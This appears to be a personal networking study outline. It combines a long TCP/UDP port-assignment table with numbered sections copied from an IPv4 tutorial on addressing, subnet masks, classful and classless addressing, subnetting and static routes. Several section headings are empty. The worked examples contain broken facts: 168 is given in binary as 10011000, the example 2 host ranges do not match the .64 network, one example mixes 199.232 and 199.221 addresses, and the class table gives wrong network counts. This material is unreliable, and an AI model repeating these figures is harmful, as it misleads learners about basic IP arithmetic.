15000 	TCP 		hydap, Hypack Hydrographic Software Packages Data Acquisition 	Official
15000 		UDP 	hydap, Hypack Hydrographic Software Packages Data Acquisition 	Official
15556 	TCP 	UDP 	Jeex.EU Artesia (direct client-to-db.service) 	Unofficial
15567 		UDP 	Battlefield Vietnam and mods 	Unofficial
15345 	TCP 	UDP 	XPilot Contact 	Official
16000 	TCP 		shroudBNC 	Unofficial
16080 	TCP 		Mac OS X Server Web (HTTP) service with performance cache[101] 	Unofficial
16200 	TCP 		Oracle Universal Content Management Content Server 	Unofficial
16250 	TCP 		Oracle Universal Content Management Inbound Refinery 	Unofficial
16384 		UDP 	Iron Mountain Digital online backup[citation needed] 	Unofficial
16567 		UDP 	Battlefield 2 and mods 	Unofficial
17500 	TCP 		Dropbox LanSync Protocol (db-lsp); used to synchronize file catalogs between Dropbox clients on your local network. 	Official
17500 		UDP 	Dropbox LanSync Discovery (db-lsp-disc); used to synchronize file catalogs between Dropbox clients on your local network; is transmitted to broadcast addresses. 	Official
18010 	TCP 		Super Dancer Online Extreme(SDO-X)—CiB Net Station Malaysia Server[citation needed] 	Unofficial
18104 	TCP 		RAD PDF Service 	Official
18180 	TCP 		DART Reporting server[citation needed] 	Unofficial
18200 	TCP 	UDP 	Audition Online Dance Battle, AsiaSoft Thailand Server—Status/Version Check 	Unofficial
18201 	TCP 	UDP 	Audition Online Dance Battle, AsiaSoft Thailand Server 	Unofficial
18206 	TCP 	UDP 	Audition Online Dance Battle, AsiaSoft Thailand Server—FAM Database 	Unofficial
18300 	TCP 	UDP 	Audition Online Dance Battle, AsiaSoft SEA Server—Status/Version Check 	Unofficial
18301 	TCP 	UDP 	Audition Online Dance Battle, AsiaSoft SEA Server 	Unofficial
18306 	TCP 	UDP 	Audition Online Dance Battle, AsiaSoft SEA Server—FAM Database 	Unofficial
18333 	TCP 		Bitcoin testnet[91] 	Unofficial
18400 	TCP 	UDP 	Audition Online Dance Battle, KAIZEN Brazil Server—Status/Version Check 	Unofficial
18401 	TCP 	UDP 	Audition Online Dance Battle, KAIZEN Brazil Server 	Unofficial
18505 	TCP 	UDP 	Audition Online Dance Battle, Nexon Server—Status/Version Check 	Unofficial
18506 	TCP 	UDP 	Audition Online Dance Battle, Nexon Server 	Unofficial
18605 	TCP 	UDP 	X-BEAT—Status/Version Check 	Unofficial
18606 	TCP 	UDP 	X-BEAT 	Unofficial
19000 	TCP 	UDP 	Audition Online Dance Battle, G10/alaplaya Server—Status/Version Check 	Unofficial
19000 		UDP 	JACK sound server 	Unofficial
19001 	TCP 	UDP 	Audition Online Dance Battle, G10/alaplaya Server 	Unofficial
19226 	TCP 		Panda Software AdminSecure Communication Agent 	Unofficial
19283 	TCP 	UDP 	K2 - KeyAuditor & KeyServer, Sassafras Software Inc. Software Asset Management tools 	Official
19294 	TCP 		Google Talk Voice and Video connections [102] 	Unofficial
19295 		UDP 	Google Talk Voice and Video connections [102] 	Unofficial
19302 		UDP 	Google Talk Voice and Video connections [102] 	Unofficial
19315 	TCP 	UDP 	KeyShadow for K2 - KeyAuditor & KeyServer, Sassafras Software Inc. Software Asset Management tools 	Official
19540 	TCP 	UDP 	Belkin Network USB Hub[citation needed] 	Unofficial
19638 	TCP 		Ensim Control Panel[citation needed] 	Unofficial
19812 	TCP 		4D database SQL Communication[citation needed] 	Unofficial
19813 	TCP 		4D database Client Server Communication[citation needed] 	Unofficial
19814 	TCP 		4D database DB4D Communication[citation needed] 	Unofficial
19999 			DNP - Secure (Distributed Network Protocol - Secure), a secure version of the protocol used in SCADA systems between communicating RTU's and IED's 	Official
20000 			DNP (Distributed Network Protocol), a protocol used in SCADA systems between communicating RTU's and IED's 	Official
20000 			Usermin, Web-based user tool 	Unofficial
20014 	TCP 		DART Reporting server[citation needed] 	Unofficial
20560 	TCP 	UDP 	Killing Floor 	Unofficial
20702 	TCP 		Precise TPM Listener Agent 	Unofficial
20720 	TCP 		Symantec i3 Web GUI server 	Unofficial
20790 	TCP 		Precise TPM Web GUI server 	Unofficial
21001 	TCP 		AMLFilter, AMLFilter Inc. amlf-admin default port 	Unofficial
21011 	TCP 		AMLFilter, AMLFilter Inc. amlf-engine-01 default http port 	Unofficial
21012 	TCP 		AMLFilter, AMLFilter Inc. amlf-engine-01 default https port 	Unofficial
21021 	TCP 		AMLFilter, AMLFilter Inc. amlf-engine-02 default http port 	Unofficial
21022 	TCP 		AMLFilter, AMLFilter Inc. amlf-engine-02 default https port 	Unofficial
22136 	TCP 		FLIR Systems Camera Resource Protocol 	Unofficial
22222 	TCP 		Davis Instruments, WeatherLink IP 	Unofficial
22347 	TCP 	UDP 	WibuKey, WIBU-SYSTEMS AG Software protection system 	Official
22349 	TCP 		Wolfson Microelectronics WISCEBridge Debug Protocol[103] 	Unofficial
22350 	TCP 	UDP 	CodeMeter, WIBU-SYSTEMS AG Software protection system 	Official
23073 			Soldat Dedicated Server 	Unofficial
23399 			Skype Default Protocol 	Unofficial
23513 			Duke Nukem 3D#Source code Duke Nukem Ports 	Unofficial
24444 			NetBeans integrated development environment 	Unofficial
24465 	TCP 	UDP 	Tonido Directory Server for Tonido which is a Personal Web App and P2P platform 	Official
24554 	TCP 	UDP 	BINKP, Fidonet mail transfers over TCP/IP 	Official
24800 			Synergy: keyboard/mouse sharing software 	Unofficial
24842 			StepMania: Online: Dance Dance Revolution Simulator 	Unofficial
25000 	TCP 		Teamware Office standard client connection 	Official
25003 	TCP 		Teamware Office client notifier 	Official
25005 	TCP 		Teamware Office message transfer 	Official
25007 	TCP 		Teamware Office MIME Connector 	Official
25010 	TCP 		Teamware Office Agent server 	Official
25560 	TCP 		codeheart.js Relay Server 	Unofficial
25565 	TCP 	UDP 	Minecraft Dedicated Server 	Official
25565 			MySQL Standard MySQL port 	Unofficial
25570 			Manic Digger default single player port 	Unofficial
25826 		UDP 	collectd default port[104] 	Unofficial
25888 		UDP 	Xfire (Firewall Report, UDP_IN) IP Address (206.220.40.146) resolves to gameservertracking.xfire.com. Use unknown. 	Unofficial
25999 	TCP 		Xfire 	Unofficial
26000 		UDP 	id Software's Quake server 	Official
26000 	TCP 		id Software's Quake server 	Official
26000 	TCP 		CCP's EVE Online Online gaming MMORPG 	Unofficial
26850 	TCP 		War of No Return Server Port[citation needed] 	Unofficial
26900 	TCP 		CCP's EVE Online Online gaming MMORPG 	Unofficial
26901 	TCP 		CCP's EVE Online Online gaming MMORPG 	Unofficial
27000-27030 		UDP 	Steam Client 	Unofficial
27000 		UDP 	(through 27006) id Software's QuakeWorld master server 	Unofficial
27000-27009 	TCP 		FlexNet Publisher's License server (from the range of default ports) 	Unofficial
27010 			Source engine dedicated server port 	Unofficial
27014-27050 	TCP 		Steam Downloads 	Unofficial
27014 			Source engine dedicated server port (rare) 	Unofficial
27015 			GoldSrc and Source engine dedicated server port 	Unofficial
27016 			Magicka server port 	Unofficial
27017 			mongoDB server port 	Unofficial
27374 			Sub7 default. 	Unofficial
27500-27900 		UDP 	id Software's QuakeWorld 	Unofficial
27888 		UDP 	Kaillera server 	Unofficial
27900-27901 			Nintendo Wi-Fi Connection 	Unofficial
27901-27910 		UDP 	id Software's Quake II master server 	Unofficial
27950 		UDP 	OpenArena outgoing 	Unofficial
27960-27969 		UDP 	Activision's Enemy Territory and id Software's Quake III Arena, Quake III and Quake Live and some ioquake3 derived games (OpenArena incoming) 	Unofficial
28000 			Bitfighter Common/default Bitfighter Server 	Unofficial
28001 			Starsiege: Tribes Common/default Tribes v.1 Server 	Unofficial
28395 	TCP 		www.SmartSystemsLLC.com Used by Smart Sale 5.0[citation needed] 	Unofficial
28785 		UDP 	Cube 2 Sauerbraten[105] 	Unofficial
28786 		UDP 	Cube 2 Sauerbraten Port 2[105] 	Unofficial
28852 	TCP 	UDP 	Killing Floor 	Unofficial
28910 			Nintendo Wi-Fi Connection[citation needed] 	Unofficial
28960 		UDP 	Call of Duty; Call of Duty: United Offensive; Call of Duty 2; Call of Duty 4: Modern Warfare; Call of Duty: World at War (PC Version) 	Unofficial
29000 			Perfect World International Used by the Perfect World International Client 	Unofficial
29292 	TCP 		TMO Integration Service Communications Port, Used by Transaction Manager SaaS (HighJump Software)[citation needed] 	Unofficial
29900-29901 			Nintendo Wi-Fi Connection[citation needed] 	Unofficial
29920 			Nintendo Wi-Fi Connection[citation needed] 	Unofficial
30000 			Pokémon Netbattle 	Unofficial
30301 			BitTorrent 	Unofficial
30564 	TCP 		Multiplicity: keyboard/mouse/clipboard sharing software 	Unofficial
30718 		UDP 	Lantronix Discovery for Lantronix serial-to-ethernet devices 	Unofficial
30777 	TCP 		ZangZing agent 	Unofficial
31337 	TCP 		Back Orifice—remote administration tool (often Trojan horse) 	Unofficial
31415 			ThoughtSignal—Server Communication Service (often Informational) 	Unofficial
31456 	TCP 		TetriNET IRC gateway on some servers 	Unofficial
31457 	TCP 		TetriNET 	Official
31458 	TCP 		TetriNET Used for game spectators 	Unofficial
31620 	TCP 	UDP 	LM-MON (Standard Floating License Manager LM-MON) 	Official
32123 	TCP 		x3Lobby Used by x3Lobby, an internet application. 	Unofficial
32245 	TCP 		MMTSG-mutualed over MMT (encrypted transmission) 	Unofficial
32769 	TCP 		FileNet RPC 	Unofficial
32887 	TCP 		Use by "Ace of Spades" game 	Unofficial
32976 	TCP 		LogMeIn Hamachi (VPN tunnel software; also port 12975)—used to connect to Mediation Server (bibi.hamachi.cc); will attempt to use SSL (TCP port 443) if both 12975 & 32976 fail to connect 	Unofficial
33434 	TCP 	UDP 	traceroute 	Official
33982 	TCP 	UDP 	Dezta software 	Unofficial
34443 			Linksys PSUS4 print server[citation needed] 	Unofficial
34567 	TCP 		EDI service[106] 	Official
36963 		UDP 	Any of the USGN online games, most notably Counter Strike 2D multiplayer (2D clone of popular CounterStrike computer game) 	Unofficial
37659 	TCP 		Axence nVision[citation needed] 	Unofficial
37777 	TCP 		Digital Video Recorder hardware[citation needed] 	Unofficial
40000 	TCP 	UDP 	SafetyNET p Real-time Industrial Ethernet protocol 	Official
40123 		UDP 	Flatcast[citation needed] 	Unofficial
41823 	TCP 	UDP 	Murealm Client[citation needed] 	Unofficial
43047 	TCP 		TheòsMessenger second port for service TheòsMessenger[citation needed] 	Official
43034 	TCP 	UDP 	LarmX.com™ database update mtr port[citation needed] 	Unofficial
43048 	TCP 		TheòsMessenger third port for service TheòsMessenger[citation needed] 	Official
43594 	TCP 		RuneScape, FunOrb, Runescape Private Servers game servers 	Unofficial
43595 	TCP 		RuneScape JAGGRAB servers 	Unofficial
45824 	TCP 		Server for the DAI family of client-server products[citation needed] 	Official
47001 	TCP 		WinRM - Windows Remote Management Service [107] 	Official
47808 	TCP 	UDP 	BACnet Building Automation and Control Networks (4780810 = BAC016) 	Official
49151 	TCP 	UDP 	Reserved[1]
	11.2

12. IP

	12.1 IPv4

		12.1.1 Internet Protocol IPv4 
http://www.inetdaemon.com/tutorials/internet/ip/index.shtml
Internet Protocol is part of the Internet suite of communications protocols that provides globally unique addresses in dotted quad notation, transmits data in packets and performs routing between IP based networks.

This entire tutorial pertains to what is referred to as Internet Protocol version 4 (IPv4). There is also exists the next generation of Internet Protocol version 6 (IPv6 or IPng) that was created to fix some of the problems that weren't foreseen when IPv4 was created. Most Internet Service Providers are capable of handling IPv6, but the vast majority of Internet users are still using IPv4.

Internet Protocol is what makes the Internet work!


			12.1.1.1 INTRODUCTION

				12.1.1.1.1 Introduction to Internet Protocol

					12.1.1.1.1.1 What is 'Internet Protocol' ?

Internet Protocol (IP) is a piece of software that operates at the Network Layer of the OSI Model. IP provides the following:

    Unique Addresses
    Connectionless Communication
    Routing
    Unicast, Broadcast and Multicast

UNIQUE ADDRESSES

Everything connected to the Internet must have a unique numerical address. Just like your house has a unique address, so does each computer attached to the Internet. These addresses are not fixed, and can be changed when necessary. These addresses are represented in what is called 'dotted-decimal notation' which means is that there are numbers with dots in between them that look like this: 204.25.183.4.

Always remember that computers use these dotted-decimal 'IP Addresses' to communicate and never use letters or names.
CONNECTIONLESS COMMUNICATION

IP communication is connectionless, and does not bother to set up dedicated end-to-end connections for communication. Upper layer protocols such as TCP are used for setting up connections and tearing them down, managing the recovery of lost data and other errors. These protocols function at the Transport layer of the OSI model or higher.
ROUTING

IP is aware when a computer's address is part of the local group of computers, or somewhere else. Routing is the part of IP that allows very intelligent and specialized routing devices (routers) to recognize that information is not part of the local group of machines, and needs to be forwarded to the destination. These devices are smart enough to 'figure out' how to get to destinations they aren't directly connected to. The process of forwarding the information is called routing. Routing is covered in detail in another section.

					12.1.1.1.1.2 What is an 'IP Network'?
Networks provide communication between computing devices. To communicate properly, all computer (hosts) on a network need to use the same communication protocols. An Internet Protocol network is a network of computer using Internet Protocol for their communication protocol.

All computer within an IP network must have an IP address that uniquely identifies that individual host. An Internet Protocol-based network (an IP Network) is a group of hosts that share a common physical connection and that use Internet Protocol for network layer communication. The IP addresses in an IP network are contiguous, that is, one address follows right after the other with no gaps.
Address Types in an IP Network

Within a given range of IP addresses used in every IP network are special addresses reserved for

    Host Addresses
    Network Addresses
    Broadcast Addresses

In addition, a IP network has a subnet mask. The subnet mask is a value stored one each computer that allows that computer to identify which IP addresses are within the network to which they are attached, and which IP addresses are on an outside network.
Host address

A host's IP address is the address of a specific host on an IP network. All hosts on a network must have a unique IP address. This IP address is usually not the first or the last IP address in the range of network IP addresses as the first IP address and last IP address in the range of IP addresses are reserved for special functions. The host addresses are all the addresses in the IP network range of IP addresses except the first and last IP addresses. Host IP addresses allow network hostst to establish one-to-one direct communication. This one-to-one communication is referred to as unicast communication.

All host IP addresses can be split into two parts: a network part and a host part. The network part of the IP addresses identifies the IP Network the host is a member of. The host part uniquely identifies an individual host.
Network Address

The network address is the first IP address in the range of IP addresses. To be more precise, the network address is the address in which all binary bits in the host portion of the IP address are set to zero. The purpose of the Network Address is to allow hosts that provide special network services to communicate. In practice, the network address is rarely used for communication.
Broadcast Address

The broadcast IP address is the last IP address in the range of IP addresses. To be more precise, the broadcast address is the IP address in which all binary bits in the host portion of the IP address are set to one. The broadcast address is reserved and allows a single host to make an announcement to all hosts on the network. This is called broadcast communication and the last address in a network is used for broadcasting to all hosts because it is the address where the host portion is all ones. This special address also sometimes called the all hosts address. Some vendors allow you to set an address other than the last address as the broadcast address.

Note that each network has its own network and broadcast addresses. Network addresses do not necessarilly have a zero in the decimal representation of the host portion of their address.
EXAMPLE 1

				network portion					host portion 	 
Network Address (decimal) 	192 	. 	168 	. 	1 	. 	0 	All zeroes in the host portion
Network Address (binary) 	11000000 	. 	10011000 	. 	0000001 	. 	000000
 
First host address (decimal) 	192 	. 	168 	. 	1 	. 	1 	

00000001
00000010
00000011
...
11111100
11111101
11111110
First host address (binary) 	11000000 	. 	10011000 	. 	00000001 	. 	00000001
...and all the addresses in between.
Last host address (decimal) 	192 	. 	168 	. 	1 	. 	254
Last host address (binary) 	11000000 	. 	10011000 	. 	00000001 	. 	11111110
 
Broadcast Address (decimal) 	192 	. 	168 	. 	1 	. 	255 	All ones in the host portion
Broadcast Address (binary) 	11000000 	. 	10011000 	. 	00000001 	. 	11111111

HINT: If this table is giving you trouble, you might need help with binary.
EXAMPLE 2

In example 2, we borrow 2 bits from what would normally be the host portion and use it as bits that indicate the network portion. This makes a smaller network of just 64 addresses, of which 62 are usable for hosts. Remember, the first address in a range of IP addresses is reserved for the network address. The last address is reserved for the broadcast address.
				network portion					|host portion 	 
Network Address (decimal) 	192 	. 	168 	. 	1 	. 	64 	All zeroes in the host portion
Network Address (binary) 	11000000 	. 	10011000 	. 	0000001 	. 	01|000000
 
First host address (decimal) 	192 	. 	168 	. 	1 	. 	1 	 
First host address (binary) 	11000000 	. 	10011000 	. 	00000001 	. 	01000001
...and all the addresses in between.
Last host address (decimal) 	192 	. 	168 	. 	1 	. 	254
Last host address (binary) 	11000000 	. 	10011000 	. 	00000001 	. 	01111110
 
Broadcast Address (decimal) 	192 	. 	168 	. 	1 	. 	127 	All ones in the host portion
Broadcast Address (binary) 	11000000 	. 	10011000 	. 	00000001 	. 	01111111

HINT: If this table is giving you trouble, you might need help with binary.
HOW IT WORKS

Your computer uses a a mask in its network connection that allows it to determine whether the computer it wants to talk to over the local network is actaully on the local network or on a network outside the local network. If it is a computer that is local, it will use a local protocol to find the other computer's hardware address. If the other computer is not local (it is outside the local network), then it will send the data to the local gateway (usually called the default gateway). Your computer will try to determine the hardware address of the local default gateway and will use the hardware address in the Ethernet header (or FDDI header or Token Ring header etc.). The Ethernet frame will contain a payload which will be filled with IP data. The IP address of the remote computer will be in this payload as part of the IP header. Since the IP address in the IP datagram is the remote computer, but the Ethernet frame is addressed to the local default gateway, the default gateway will accept the Ethernet frame, read the IP data, verify the IP address is indeed outside the local network and then forward the IP datagram over whatever other network connections the computer has that will allow it to reach all the other outside networks.

That's how Internet Protocol makes routing work in a network with a default gateway.
Fact and Fiction

Routers are NOT used for local communication on the local IP network. They are bypassed completely and are not required. Routers are used to forward data into different networks and to restrict broadcasts on the local network from swamping external networks with traffic that is important only to the local network.
					12.1.1.1.1.3 What is an 'IP Host'?
An Internet host can be a machine or an application connected to the Internet that has an Internet Protocol address (IP address). An IP address is used to uniquely identify every host on the Internet. Because these IP address are unique, they can be used as the source and destination IP addresses in any IP-based communication. At the most basic level, Internet hosts fall into two categories, Servers and Clients. See InetDaemon's tutorial on Client-Server relationships for more information.

Some say that a computer 'hosts' or 'serves' the clients that use an application. This is the orgin of the terms host and server. A host is not neccessarilly a single computer. It is possible for a single computer to use multiple IP addresses, especially when it is providing multiple services such as an e-mail server and a web server at the same time. One IP address will be used to identify the e-mail server software, the other IP address will identify the web server software but both server applications are running at the same time on the same computer. The IP addresses allow each to be accessed individually.

Hosts are organized into groups called Networks. See the next section on Networks for more information.
					12.1.1.1.1.4 What is an IP address?

					12.1.1.1.1.5
        Where do IP Addresses come from?
        How do I get an IP address for my home computer?
        How do I get IP addresses for my company?

				12.1.1.1.2 IP Addresses

					12.1.1.1.2.1 Internet Protocol Addresses (IP Addresses) 
When using the Internet, humans use names such as www.google.com or www.ebay.com, or ftp.myhostingprovider.com We call those"addresses" or in the case of websites, "URLs" but those are really just names provided for human convenience. The Internet uses its own set of unique addresses because computers run the Internet and computers use numbers. There is a system for finding which who owns the name (Domain Name registries), and another system for figuring out which unique numeric address goes with the name (Domain Name Service).

Computers do their work over the Internet and across networks using numeric addresses. Your computer is configured with an IP address and the computer you wish to communicate with (the computer-server that is serving www.google.com for instance) also has an IP address. To communicate, a connection is opened from one computer to the other computer using the IP addresses as the source and destination addresses for that communication.

Your computer gets an address one of two ways, either your network administrator enters it into your computer manually, or it is learned by the computer dynamically using a protocol called DHCP. When the IP address is assigned by the network administrator manually, this is called a ´fixed´ or ´static´ IP address. If an IP address is learned by your computer automatically when the computer starts up via DHCP, it's called a ´dynamic´ IP. If the computer has an address stored in its configuration, it is called a 'static' address.

DHCP (or BootP) of course, needs to be set up and running if a computer is to receive a dynamically assigned IP address.
IP Address Format

An IP address is a number used to identify the logical connection of a computer to a physical network is a 32-bit binary address, composed of four, 8-bit numbers. IP address are represented as four decimal numbers between 0 and 255 separated by dots; (eg. 199.221.66.10). This is referred to as dotted-decimal notation. Anything attatched to an IP network can be assigned an IP address. Note that this means that it is possible for a single host to have multiple IP addresses if it is running multiple network interfaces to support services such as DNS, Web or Mail server software. Addresses are always unique. Because IP addresses are software configured, it is easy to move hosts from one network to another simply by changing the IP address or the network mask. This process is called renumbering.
Network and Host Portion of an IP Address

When looking at an IP address, the left-most portion of the address identifies which network the mahcine (host) belongs to. The right-most portion is used as the address of the host itself. A large number of addresses in use (but not all of them) look something like this:
VALUE		NETWORK						HOST
IN DECIMAL 	199 	232 	66				10
IN BINARY 	11000111 	11101000 	01000010 	00001010

In the example above, the network address is 199.232.66 and the host portion of the address is 20, the complete IP address is 199.221.66.10. All the computers on the same local network would have the same network number in their address. Thus, two computers on the same network might be 199.221.66.10 and 199.221.66.44.

When two hosts with IP addresses communicate, they send IP datagrams. IP datagrams contain the source and destination addresses of the hosts communicating. Only the addresses are recorded in the packet. There is no information stored in the packet to tell us which part of the address is network and which is host. If this is true, then how would we figure out which part of the address is the network portion, and which is the host portion?

First, you must remember that all hosts on the same network will have the same network address (the network portion of the IP address will be the same for all hosts). Only the host portion will be different and unique for each host on the network.

Different networks also have different network addresses. Network A would have a different address from Network B. From the perspective of determining the correct network, the individual host address is irrelevant. We will need it later to find the host itself ON the network, but we don't need to look at it yet, since we need to find the correct network first.

To find a particular host, you first find the network that host is on, then ask that network to find the host host. There are two solutions to handling this network vs. host address problem, and they are similar but separate addressing types: classful, and classless.

Classful Addressing was the first addressing scheme developed. It helped manage the IP space and make organization of networks and hosts possible, but it could not support the growing complexity of the Internet, and wasted a lot of address space, so an new scheme was developed called Classless Addressing. Classless Addressing was more efficient by allowing the assignment of smaller blocks of addresses.
The Subnet Mask

The Subnet Mask is a value that is stored in the configuration of a computer along with the IP address. The Subnet Mask gives the computer a simple way to figure out whether the IP address of another computer is on the same local network, or on a different local network. Bear in mind that for this definition of a mask, a 'local network' is defined as a group of computers with IP addresses in a limited range.

				12.1.1.1.3 IP Address Exhaustion

					12.1.1.1.3.1 Public IPv4 Addresses
Public IP addresses sometimes called 'routable' addresses are addresses that are used when communicating with or connecting to the Internet. These addresses are designated by the Internet Assigned Numbers Authority for use in web servers, e-mail servers, firewalls and other devices that are directly connected to the Internet.

All addresses are managed by ICANN and allocated to organizations by IANA, so you cannot arbitrarilly add the IP addresses to your computers and connect them to the Internet as they may be in use elsewhere on the Internet.

If you need IP addresses to communicate with the Internet, see my tutorial on obtaining IP addresses.

I have extracted the public addresses by mapping around the addresses listed in RFC 3330 which was published in 2002. No additional RFC's have been issued as of the date this tutorial was written, but this is subject to change over time.
Public Addresses
|  1.0.0.0 - 9.255.255.255
|  11.x.x.x - 126.255.255.255
|  129.0.0.0 - 169.253.255.255
|  169.255.0.0 - 172.15.255.255
|  172.32.0.0 - 191.0.1.255
|  192.0.3.0 - 192.88.98.255
|  192.88.100.0 - 192.167.255.255
|  192.169.0.0 - 198.17.255.255
|  198.20.0.0 - 223.255.255.255

					12.1.1.1.3.2 Classful IPv4 Addressing
Classful IPv4 Addressing

Computers communicating using Internet Protocol (IP) send datagrams. IP datagram contain a source IP address, and a destination IP address. However, an IP datagram does not contain any network subnet mask information, thus it is difficult to know which groups of computers (hosts) formed a network.

Source Address
    The IP address of the host that sent the datagram (sender).
Destination Address
    The IP address of the host the datagram is being sent to (receiver).
Subnet Mask
    A piece of information stored on the local host that allows it to determine whether a remote host is part of the local network, or is part of a different outside network.

During the process of delivering (routing) an IP datagram, only the destination IP address is significant. In classful addressing information about the host's location and the network it is located on is assumed to be encoded into the IP address within the datagram. There aren't any fields provided in an IP datagram to inform the receiver where the network portion of the IP address leaves off and where the host portion of the IP address begins. (See IPv4 Addressing section for more information).
WHAT IS A CLASS?

Classful addressing divides the entire IP address space (0.0.0.0 to 255.255.255.255) into 'classes', or special ranges of contiguous IP addresses (no addresses missing between the first and last address in the range). Classful addressing makes it posible to determine the network portion of the IP address by looking at the first four bits of the first octet in the IP address. The first four bits are referred to as the 'most significant bits' of the first octet and are used to determin what class of IP address is being used. The value of the first four bits determines the range of actual numerical values of the first octet of the IP addresses in that class. From this information, a receiving host can determine which part of the IP address is being used to identify the specific network on which the host resides, and which portion of the IP address is used to identify the host.

The different classes of IP addresses (Class A, Class B, Class C, Class D & Class E) were created to allow for carving up the entire set of all IP addresses into chunks of different sizes that would 'fit' the number of hosts on the network for which the IP address space was being supplied. The chart below gives you a breakdown of how the Classful system breaks up the IP address space.
N = Network  |  h = Host
First Octet			IP Address Characteristics
Most		Value		Addr.	Network vs.	# NETWORKS	# HOSTS	
Significant			Class	Host	
BITS		Ranges
0000		0-126		A 	N.h.h.h 	256		16,777,214
-- 		127		- 	-		Special - Local Loopback
1000 		128-191 	B 	N.N.h.h 	65,536		65,534
1100 		192-223 	C 	N.N.N.h 	16,777,216 	254
1110 		224 - 239 	D 	Special 	N/A		N/A
1111 		240 +		E 	Special 	N/A 		N/A

It is possible to waste IP addresses by assigning blocks of IP addresses which fall along octet boundaries (the dots between the numbers in the decimal representation of the IP address). Most often a class C address was supplied to anyone requesting space, as few networks had more than 256 hosts. But the networks grew to more than 256 hosts, and needed more space, so Class B addresses were given out. But if a network has only 500 hosts, and you assign a class B IP address block to that network, 65,034 addresses will go unused. This is a terribly inefficient use of space, and as networks grew larger the Internet grew; the need to use the IP address space more and more efficiently became ever more critical.

One solution that was created for reduce utilization of IP addresses was Network Address Translation. This involved the use of private IP addresses and a device that translates private IP addresses into public IP addresses.

As the list of available IP addresses was depleted it became clear that a new solution was needed that provided more addresses and efforts turned towards developing what is called IP v6.

					12.1.1.1.3.3 Classless IPv4 Addressing
All IP addresses have a network and host portion. In classful addressing, the network portion ends on one of the separating dots in the address (on an octet boundary). Classless addressing uses a variable number of bits for the network and host portions of the address.

 
Decimal 	192 	160 	20 	48
Binary 	11000000 	10100000 	00010100 	0011 	0000
  	<-------- 28 bits Network -------> 	4 bits host

Classful addressing divides an IP address into the Network and Host portions along octet boundaries. Classless addressing treats the IP address as a 32 bit stream of ones and zeroes, where the boundary between network and host portions can fall anywhere between bit 0 and bit 31. The network portion of an IP address is determined by how many 1's are in the subnet mask. Again, this can be a variable number of bits, and although it can fall on an octet boundary, it does not necessarilly need to. A subnet mask is used locally on each host connected to a network, and masks are never carried in IPv4 datagrams. All hosts on the same network are configured with the same mask, and share the same pattern of network bits. The host portion of each host's IP address will be unique.

					12.1.1.1.3.4 Variable Length Subnet Masking
The Internet's explosive growth eventually required the more efficient use of the IP address space available. Variable Length Subnet Masking is a technique used to allow more efficient assignment of IP addresses. Originally Internet addresses were carved up into small, medium and large size blocks of contiguous addresses based on the vaues of the first four bits in the first octet of the IP address. These were often referred to as classful addresses. By carving classful address blocks into smaller classless blocks, you waste fewer addresses. The process of carving out smaller blocks from the larger blocks was called subnetting.

Many organization's networks started very small and were assigned class C addresses. A class C address range contains 256 addresses. Soon, these organizations grew and so did their networks. Networks that needed to expand beyond their original class C range used a technique called supernetting to allow them to turn two contiguous IP address blocks into one network.
SUBNETTING and SUPERNETTING

Originally the entire range of IP addresses were carved up into small, medium and large chunks of addresses. Networking equipment figured which addresses were all part of a network by looking at the first four bits of the address. There were five classes of addresses used. Subnetting is the process of borrowing bits from the host portion of an address to provide bits for identifying additional sub-networks. VLSM is most frequently referred to as subnetting.

Supernetting is different. Supernetting merges several smaller blocks of IP addresses (networks) that are continuous into one larger block of addresses. There can't be any 'holes' in the range. Supernetting is done by borrowing network bits to combine several smaller networks into one larger network.

For instance, a class 'C' block has 256 possible addresses in it. This block could be split into two classless blocks of 128 addresses each by borrowing a single bit from the host portion of the class 'C' address.
Standard Class 'C' network
		Network 	Network 	Network 	Host

Class 'C' 	192		64		123		0
address

Mask
(Decimal) 	255		255		255		0
Mask
(Binary) 	11111111 	11111111 	11111111 	00000000

The mask and address above combine to give you a range of addresses from 192.64.123.0 through 192.64.123.255.
Subnet #1
		Network 	Network 	Network 	Subnet 	Host
Class 'C'
address 	192		64		123		0
Mask
(Decimal) 	255		255		255		128
Mask
(Binary) 	11111111 	11111111 	11111111 	1 	0000000

The mask and address above combine to give you a range of addresses from 192.64.123.0 through 192.64.123.127.
Subnet #2
  	Network 	Network 	Network 	Subnet 	Host
Class 'C'
address 	192 	64 	123 	128
Mask
(Decimal) 	255 	255 	255 	128
Mask
(Binary) 	11111111 	11111111 	11111111 	1 	0000000

The mask and address above combine to give you a range of addresses from 192.64.123.128 through 192.64.123.255.

Note that the mask used to split the class 'C' network into two smaller subnets is the same, but note that the starting address is different. The first subnet starts with a zero in the last octet, while the second subnet has a starting address of 128 in the last octet.

					12.1.1.1.3.5
				12.1.1.1.4 IP Routing
Routing is the process of moving data from one network to another by forwarding packets via gateways. With IP based networks, the routing decision is based on the destination address in the IP packet's header. Routing also occurs in networks running other protocols, which are not discussed here.

ROUTING CONCEPTS


					12.1.1.1.4.1 DEFINITIONS AND TERMS

						12.1.1.1.4.1.1  Route
						
Route
    A route may be defined as information that is used to make a decision about how to forward a packet so that it will reach its intended destination network. 

What is a route?

To understand what a route is, we have to explain what routing is, why we need it and how routers do routing.

Routing is the process of moving a packet of data from one network to another network based on the destination IP address. The Internet uses routing to move data from your computer, across several networks, to reach a final destination, like a website. Specialized computer devices that perform this routing function are referred to as routers. Routers use the information contained in a route to make decisions about which network interface to forward a packet through in order to reach the destination address in the packet. Routers maintain a list of routes which is often referred to as a routing table.

Routers look up routes in the routing table to figure out how to move data from one network to another network. Routes are simply the signposts that tell a router which network interface to forward a packet through in order to reach the packet's intended destination.
Types of Routes

There are two basic kinds of routes: static or dynamic.
Static Routes

Routes can be entered into a router by a person who administrates the network (the network administrator). Since these routes are entered by the administrator, and these routes don't change until the administrator changes them, they are referred to as static routes.

Cisco devices (and several other routing devices) use the following command to configure a static route:


ip route <destination network address> <network mask> <gateway/router address> <weight>

Example:   ip route 192.168.1.0 255.255.255.0 192.168.1.1
 

NULL ROUTES

A static route which points to the null 0 interface on a Cisco router is called a null route. Null routes are used to cause packets that have been sent to an unreachable network to be dropped from the network thereby preventing those packets from consuming bandwidth.

DEFAULT ROUTES

A default route is also referred to as the 'route of last resort'. This is the route a router uses when all other routes have been examined and none seem to be the right route to use.
Dynamic Routes

If the routes are learned on-the-fly from other routers, it is called a dynamically-learned route, or a dynamic route for short. Dynamic routes are learned from routing protocols.
       						12.1.1.1.4.1.2  Router
